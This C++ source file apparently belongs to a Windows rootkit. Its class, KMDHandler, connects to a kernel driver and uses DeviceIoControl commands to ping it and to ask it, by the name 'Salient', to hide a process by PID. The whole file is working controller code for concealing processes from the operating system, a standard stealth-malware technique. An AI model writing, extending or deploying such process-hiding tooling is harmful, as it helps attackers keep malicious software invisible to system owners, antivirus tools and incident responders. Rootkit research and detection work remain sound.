#include "KMDHandler.h"

bool KMDHandler::connectDriver(wchar_t* name)
{
	wchar_t* driverFullPath = (wchar_t*)malloc(sizeof(TCHAR) * MAX_PATH);
	_snwprintf_s(driverFullPath, MAX_PATH, MAX_PATH, L"\\\\.\\%s", name);
	HANDLE hDriver = CreateFile(driverFullPath, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to connect to driver at %S\n", driverFullPath);
		return false;
	}

	this->hDriver = hDriver;

	free(driverFullPath);
	
	return true;
}

bool KMDHandler::pingDriver()
{
	char outBuffer[128] = { 0 };
	char inBuffer[128] = { 0 };
	DWORD dwBytesRead = 0;
	printf("\n[*] Pinging driver\n");
	DeviceIoControl(this->hDriver, IOCTL_PING_CMD, inBuffer, strlen(inBuffer), outBuffer, sizeof(outBuffer), &dwBytesRead, NULL);
	printf("[*] Driver: %s\n", outBuffer);
	return true;
}

bool KMDHandler::hideProcess(int pID)
{
	char outBuffer[128] = { 0 };
	char inBuffer[128] = { 0 };
	sprintf_s(inBuffer, "%u", pID);
	DWORD dwBytesRead = 0;
	printf("\n[*] Asking Salient to hide PID %u\n", pID);
	DeviceIoControl(this->hDriver, IOCTL_PHIDE_CMD, inBuffer, strlen(inBuffer), outBuffer, sizeof(outBuffer), &dwBytesRead, NULL);
	printf("[*] Driver: %s\n", outBuffer);
	return true;

}